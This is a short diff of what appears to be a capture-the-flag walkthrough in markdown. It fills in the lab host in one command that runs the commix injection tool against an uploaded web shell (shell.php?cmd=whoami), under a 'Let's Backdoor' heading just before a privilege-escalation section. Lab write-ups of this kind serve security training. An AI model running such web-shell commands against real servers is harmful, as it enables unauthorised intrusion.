@@ -371,7 +371,7 @@ shell.php
 
 ### Let's Backdoor
 ```
-python3 commix.py http://.../jQuery-File-Uploader/server/php/files/shell.php?cmd=whoami
+python3 commix.py http://grandline.htb/jQuery-File-Uploader/server/php/files/shell.php?cmd=whoami
 ```
 
 # Privilege Escalation
